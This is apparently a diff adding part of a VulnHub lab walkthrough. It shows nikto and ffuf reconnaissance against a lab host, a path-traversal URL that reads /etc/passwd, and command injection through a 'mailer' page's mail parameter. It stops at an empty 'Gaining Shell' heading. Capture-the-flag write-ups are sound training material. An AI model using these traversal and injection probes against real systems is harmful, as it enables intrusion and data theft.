@@ -98,6 +98,68 @@ yes, the service is now has been moved on port 60080, so let's open the site on 
 
 ![newPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/ad7c2230-6008-43b3-84ea-83c93f0719d5)
 
+this time fuzzing the website, i found nothing, so tried to check it with `nikto` :
+
+```text
+root@kali: nikto -host http://192.168.127.233:60080
+
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.127.233
++ Target Hostname:    192.168.127.233
++ Target Port:        60080
++ Start Time:         2023-09-30 03:15:39 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php).
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ 8102 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2023-09-30 03:15:54 (GMT-4) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+yes, it found again the page `/index.php?page=../../../../../../../etc/passwd`, now i can fuzz this parameter again :
+
+```text
+root@kali: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.127.233:60080/index.php?page=FUZZ -fs 898
+
+home                    [Status: 200, Size: 1146, Words: 220, Lines: 31, Duration: 4ms]
+contact                 [Status: 200, Size: 895, Words: 182, Lines: 27, Duration: 271ms]
+'                       [Status: 200, Size: 1742, Words: 315, Lines: 39, Duration: 2ms]
+index                   [Status: 200, Size: 1361, Words: 279, Lines: 39, Duration: 516ms]
+mailer                  [Status: 200, Size: 1084, Words: 204, Lines: 30, Duration: 4ms]
+blacklist               [Status: 200, Size: 993, Words: 202, Lines: 28, Duration: 5ms]
+```
+
+let's check these words for page parameter, on checking the `mailer` value i reached to this page :
+
+![comming soon](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2672f542-8572-41a8-95f1-a66716cd6f30)
+
+checking the page source shows a comment section :
+
+![comment](https://github.com/Git-K3rnel/VulnHub/assets/127470407/aaec13b9-6775-485e-9ef3-3d8ec148b5b3)
+
+that says we can send a mail with the URL like `/?page=mailer&mail=message`, this new parameter (mail) should be tested.
+
+i simply entered the `id` value and it showed the output of id command in linux system :
+
+![id](https://github.com/Git-K3rnel/VulnHub/assets/127470407/4e8ef4bd-a30f-4205-918d-2bf86166d85a)
+
+yes, we have command injection here, and we can get a reverse shell.
+
+## 3.Gaining Shell
+
+
+
+
+
 
 
 
